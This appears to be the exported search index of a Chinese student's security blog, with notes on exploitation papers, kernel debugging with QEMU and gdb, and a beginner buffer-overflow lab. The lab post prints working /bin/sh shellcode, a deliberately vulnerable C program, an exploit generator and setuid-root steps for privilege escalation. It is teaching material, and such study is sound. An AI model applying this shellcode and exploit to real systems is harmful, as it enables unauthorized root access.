{"pages":[{"title":"关于我","text":"标签：不太萌の小新 | 菜菜呱 | 日常丧 哎呀，其实吧，感觉自己真的很废柴呀，大学基本上就这么荒废过去啦，学习我也有好好学啊，可能还是自己没用吧，虽然真的很喜欢挖洞逆向ctf，但也仅仅停留在表面上，或许也正是因为没怎么动过手实践，不知其中艰辛，才一直对其念念不忘吧…… 还有啊，大神弟弟和其他大佬小哥哥真的都是超厉害的存在呢，所以我也一定一定要努力啊！ 最后一年的修仙时光了，如果再没有任何进步，可能真的要被发配回家种田了吧（；´д｀）ゞ(才不要咧 （所以，表面丧归丧，内心一定还要悄悄为自己加油鼓劲呀 \\(●&#39;◡&#39;●)ゞ） 花了两天搭出了这个很喜欢的博客，希望可以坚持下去~ 萌新进化，先从复现&amp;刷题开始吧！ 毕竟，我可是立志要当赏金猎人のcoolcool妖系boy吖！ 梦想还是要有的嘛，万一能实现呢，嘿 (●ˇ∀ˇ●)","path":"about/index.html","date":"09-21","excerpt":""},{"title":"404","text":"","path":"404/index.html","date":"09-14","excerpt":""},{"title":"Categories","text":"","path":"categories/index.html","date":"09-14","excerpt":""},{"title":"Tagcloud","text":"","path":"tags/index.html","date":"09-14","excerpt":""},{"title":"search","text":"","path":"search/index.html","date":"09-14","excerpt":""}],"posts":[{"title":"虚拟化攻防-相关论文-阅读笔记","text":"《Row Hammer漏洞攻击研究》-综述性质 原理：反复敲打（重复读取导致比特位反转） Arm架构 攻击方法：6个 缓存刷新技术 single-side double-side 三个参数：激活间隔、刷新间隔、数据格式 缓存驱逐技术 缓存驱逐集 非缓存访问指令 页表喷射 内存重复数据删除技术 内存伏击技术：预取边道攻击+页缓存驱逐 防御方法： 《KVM虚拟机的漏洞验证与利用方式研究》-王森-北京交通大学-硕士论文 热插拔PCI芯片-2011 FIFO -2015 PCNET -2015 防御方法：ASLR 感想： 真的是有好多要看的啊！！","path":"2019/03/16/2019-03-16-虚拟化攻防_相关论文_阅读笔记/","date":"03-16","excerpt":""},{"title":"《0day漏洞分析》","text":"第一章漏洞概述： bug &amp; Vulnerability：非预期错误，逻辑上缺陷+安全性缺陷 漏洞挖掘：本质上是一种测试（fuzz-灰盒测试） 漏洞分析：缓冲区溢出等等，通过逆向和调试，寻找PoC(proof of concept)重现漏洞被触发的现场。 漏洞利用：编写shellcode，exploit利用，形成攻击 0 day：指未被公布未被修复的漏洞，利用价值与危害最大，相应的还有1 day，5 day，即黑客们会在微软刚发布修补版本后研究这些补丁，寻找差异，未升级之前的一段时间都很危险 二进制概述 PE文件 文件偏移，Imagebase,VA，RVA， VA = ImageBase + RVA 文件偏移和RVA通常一样，但也可能不一样，因为有对齐（200，1000） 工具简介OD,SoftICE,IDA,Windbg 第二章可以参考《深入理解计算机系统》 函数调用 esp: 栈顶 ebp: 最上面栈的基地址 eip：指令寄存器，指向下一条等待执行的指令（控制它就控制了程序执行流程） 参数入栈，函数返回时恢复栈平衡（在母函数或子函数中进行） 步骤： 1）局部变量，参数入栈 push 参数 2）返回地址入栈 call funcA 完成2，3两个动作 3）代码跳转 4）栈帧调整 - push ebp （保存当前栈帧状态值，以备后续恢复本栈帧） - mov ebp,esp （更新栈底） - sub esp,xxx （抬高栈顶，开辟新栈帧） eg：main(){funcA();} 参数 funcA的局部变量 &lt;---funcA栈帧 前栈帧ebp &lt;---ebp1 返回地址 &lt;---call funcA的下一条指令 参数2 参数1 （参数从右往左入栈） 局部变量 &lt;--- (main函数栈帧) ebp1 --&gt; 函数返回步骤： 1）保存返回值（给eax） 2）回收当前栈帧 - add esp，xxx - pop ebp， - retn (返回地址弹给eip，代码跳去返回地址，恢复调用前的代码区） 3) 跳转 案例攻击方法1）修改邻接变量。相当于修改了用于判断的返回值，通过溢出跳转到if成功分支2）修改返回地址。相当于直接跳转到if成功分支3）代码植入。 汇编转机器码，跳转到攻击代码，执行我们想让他做的事","path":"2019/03/16/2018-11-24-0day/","date":"03-16","excerpt":""},{"title":"入门-缓冲区溢出与利用","text":"实验原理利用 strcpy(buf,str) 导致的缓冲区溢出，精心构造str溢出后，覆盖原程序的返回地址，让程序跳转至new_addr,去指定位置执行存放的shellcode，获得root权限 重点： str的构造-&gt;计算精确覆盖位置 shellcode 编写-&gt;提权功能，并转化成汇编 exploit 编写 Q: 这和控制流劫持一样吗？有啥区别？会不会控制流劫持是劫持eip？这个只是覆盖返回地址，不太一样？查一下啊！ 实验步骤1. 环境搭建1) Ubuntu12.04 32位 （http://releases.ubuntu.com/12.04.5/ubuntu-12.04.5-desktop-i386.iso）2) 关闭ASLR sudo sysctl -w kernel.randomize_va_space = 0 sudo sysctl kernel.randomize_va_space (用来查当前值是多少，0：关闭ASLR；***1：开启堆随机化？2：开启栈随机化？***) 3）stack-guard-protection和NX在后续gcc编译时关闭 2. 脚本编写1） shellcode：12345678#include &lt;stdio.h&gt;int main( )&#123; char *name[2]; name[0] = &quot;/bin/sh&quot;; name[1] = NULL; execve(name[0], name, NULL); //主要功能：获得一个shell&#125; 将shellcode转换成汇编形式，并编写call_shellcode调用代码，编译验证能否成功得到shell 【tips】: 如何编写shellcode（之后单写一篇吧） call_shellcode.c12345678910111213141516171819202122232425/* call_shellcode.c *//*A program that creates a file containing code for launching shell*/#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;const char code[] = &quot;\\x31\\xc0&quot; /* xorl %eax,%eax */ &quot;\\x50&quot; /* pushl %eax */ &quot;\\x68&quot;&quot;//sh&quot; /* pushl $0x68732f2f */ &quot;\\x68&quot;&quot;/bin&quot; /* pushl $0x6e69622f */ &quot;\\x89\\xe3&quot; /* movl %esp,%ebx */ &quot;\\x50&quot; /* pushl %eax */ &quot;\\x53&quot; /* pushl %ebx */ &quot;\\x89\\xe1&quot; /* movl %esp,%ecx */ &quot;\\x99&quot; /* cdq */ &quot;\\xb0\\x0b&quot; /* movb $0x0b,%al */ &quot;\\xcd\\x80&quot; /* int $0x80 */; //shellcode反汇编而成int main(int argc, char **argv)&#123; char buf[sizeof(code)]; strcpy(buf, code); ((void(*)( ))buf)( ); //？？？&#125; 编译运行 gcc -z execstack -fno-stack-protection -o call_shellcode call_shellcode.c ./call_shellcode $ 成功get shell(可以输id，whoami，ls等验证) 2） stack.c12345678910111213141516171819202122232425262728/* stack.c *//* This program has a buffer overflow vulnerability. *//* Our task is to exploit this vulnerability */#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int bof(char *str)&#123; char buffer[24]; /* The following statement has a buffer overflow problem */ strcpy(buffer, str); return 1;&#125;int main(int argc, char **argv)&#123; char str[517]; FILE *badfile; //创建badfile，之后将shellcode存于此文件 badfile = fopen(&quot;badfile&quot;, &quot;r&quot;); fread(str, sizeof(char), 517, badfile); //shellcode赋给str bof(str); printf(&quot;Returned Properly\\n&quot;); return 1;&#125; 关闭地址随机化后，每次运行地址相同。gdb动态调试stack,利用得到的ebp和buffer地址，计算应覆盖的返回地址值，用于exploit的编写 动态调试： $ gcc -z execstack -fno-stack-protector -g -o stack stack.c //要加-g 参数才能构建符号表 $ touch badfile $ gdb stack GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04 Copyright (C) 2012 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot; and &quot;show warranty&quot; for details. This GDB was configured as &quot;i686-linux-gnu&quot;. For bug reporting instructions, please see: &lt;http://bugs.launchpad.net/gdb-linaro/&gt;... Reading symbols from /home/x/Desktop/xx/stack...done. (gdb) b bof Breakpoint 1 at 0x804848a: file stack.c, line 14. (gdb) run Starting program: /home/x/Desktop/xx/stack Breakpoint 1, bof ( str=0xbffff0f7 &quot;\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220X\\361\\377\\277\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220\\220&quot;...) at stack.c:14 14 strcpy(buffer, str); (gdb) p $ebp $1 = (void *) 0xbffff0d8 (gdb) p &amp;buffer $2 = (char (*)[24]) 0xbffff0b8 (gdb) p 0xbffff0d8-0xbffff0b8 $4 = 32 (gdb) quit 根据调试结果可得，ebp = 0xbffff0d8，返回地址在ebp上面，所以是ret = 0xbffff0d8+4可以跳转去的最小地址是 0xbffff0d8+8输入badfile中的buffer地址与ebp差32，返回地址ret在ebp上4，所以ret = buffer+32+4 4 | ret 4 | ebp 32 | ... | ... | buffer[0] 3） exploit.c为保证成功率，shellcode之前可以添加一些NOP，保证即使地址稍有偏移也可以完成利用123456789101112131415161718192021222324252627282930313233343536/* exploit.c *//* A program that creates a file containing code for launching shell*/#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;char shellcode[]= &quot;\\x31\\xc0&quot; /* xorl %eax,%eax */ &quot;\\x50&quot; /* pushl %eax */ &quot;\\x68&quot;&quot;//sh&quot; /* pushl $0x68732f2f */ &quot;\\x68&quot;&quot;/bin&quot; /* pushl $0x6e69622f */ &quot;\\x89\\xe3&quot; /* movl %esp,%ebx */ &quot;\\x50&quot; /* pushl %eax */ &quot;\\x53&quot; /* pushl %ebx */ &quot;\\x89\\xe1&quot; /* movl %esp,%ecx */ &quot;\\x99&quot; /* cdq */ &quot;\\xb0\\x0b&quot; /* movb $0x0b,%al */ &quot;\\xcd\\x80&quot; /* int $0x80 */;void main(int argc, char **argv)&#123; char buffer[517]; FILE *badfile; /* Initialize buffer with 0x90 (NOP instruction) */ memset(&amp;buffer, 0x90, 517); /* You need to fill the buffer with appropriate contents here */ *((long*)(buffer+36)) = 0xbffff0d8 + 0x80; //buffer+32+4 根据上述调试结果得到 memcpy(buffer+sizeof(buffer)-sizeof(shellcode), shellcode, sizeof(shellcode)); /* Save the contents to the file &quot;badfile&quot; */ badfile = fopen(&quot;./badfile&quot;, &quot;w&quot;); fwrite(buffer, 517, 1, badfile); fclose(badfile);&#125; 3. 脚本运行gcc -o exploit exploit.c ./exploit ./stack $ id uid=1000(s) gid=1000(s) groups=1000(s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare) 成功！ PS： 对stack设置UID，可以拿到root权限 $ gcc -o stack -z execstack -fno-stack-protector stack.c $ sudo chown root stack $ sudo chmod 4755 stack 小结我好讨厌写博客，实验做很快，复盘要很久（尤其调格式简直逼死强迫症==）不过回顾一下理清思路还挺有必要的，写博客麻烦还不是因为脑子乱==sad通过这一个缓冲区溢出的知识点可以展开再写几篇 如何编写shellcode控制流劫持与返回地址覆盖的区别VMware tools安装 先想到这么多，之后再补充","path":"2018/12/07/2018-12-07-bof/","date":"12-07","excerpt":""},{"title":"Ubuntu14.04下，利用QEMU+gdb调试Linux0.11内核","text":"步骤： 安装Ubuntu虚拟机 搭建调试环境 结合QEMU、gdb，开始调试 具体流程：1.安装Ubuntu虚拟机环境：VMware12，Ubuntu14.04 2.搭建调试环境1)安装必要依赖包（因为我是新安装的干净Ubuntu，里边还缺少常用软件） sudo apt-get update sudo apt-get upgrade (刚开始直接安总是报unable to locate package，应该是需要更新升级一下) sudo apt-get install vim cscope exuberant-ctags build-essential qemu lxterminal 2）下载Linux0.11内核源码到本地https://github.com/yuanxinyu/Linux-0.11 3）解压编译 cd Downloads unzip Linux-0.11-master.zip cd Linux-0.11-master make make start 4）调试 make debug ![](image/linux-0.11/make-debug.PNG&gt; （再开一个终端） gdb tools/system target remote localhost:1234 directory ./Linux-0.11-master //???设置源码目录 set architecture i8086 set dissamembly-flavor intel ![](image/linux-0.11/gdb-bootsect.PNG&gt; 然后似乎就可以gdb调试了？ b *0x7c00 c layout split x /16b 0x7df0 b main 3.gdb调试我还不太熟，每步含义都还要再去学一下 （嗯，先酱，明天继续……） 参考链接：http://blog.chinaunix.net/uid-26299634-id-4943500.htmlhttps://blog.csdn.net/longintchar/article/details/79685055https://github.com/tinyclub/linux-0.11-lab/blob/master/README.md 小结：哇，一开始真的是一脸懵啊，都不知道怎么入手，还好好多大佬都调过啦，还留了教程在网上，参考了几篇博客，也用我三脚猫的功夫仿了个大概，（也还不清楚原理==）目前看上去似乎接下来就是gdb调试代码，一步一步跟着走，看内核怎么运行的了，这块也还需要再看看书然后，听说是gdb版本啊之类的不兼容？所以linux0.11的编译文件啥的有了修改？上边链接里好像是大佬修改好的？等我明天gdb继续调，看别人文档的时候再研究一下（感觉真的好多不会，好多要学啊==大神弟弟说的果然没错）加油！","path":"2018/09/21/2018-09-21-Linux0.11_debug_with_qemu/","date":"09-21","excerpt":""},{"title":"vmware-tips","text":"问题：vmware虚拟机启动时遇到弹窗：“二进制转换与此平台长模式不兼容……” 原因：一般是由于电脑系统的 Virtualization Technology虚拟化技术功能 关闭导致的 解决方法：1.开机时按F2进入bios界面2.选择Configuration选项，将其中 Intel Virtual Technology由Disabled改为Enabled3.按F10，保存并退出，即可开启VT虚拟化功能4.保存后会自动重启电脑，之后就OK啦","path":"2018/09/17/2018-09-17-vmware_tips/","date":"09-17","excerpt":""},{"title":"萌新入坑","text":"不好意思啦 刚刚开始搭网站 不完善的地方 还请多多包涵！","path":"2018/09/16/2018-09-16-萌新入坑/","date":"09-16","excerpt":""}]}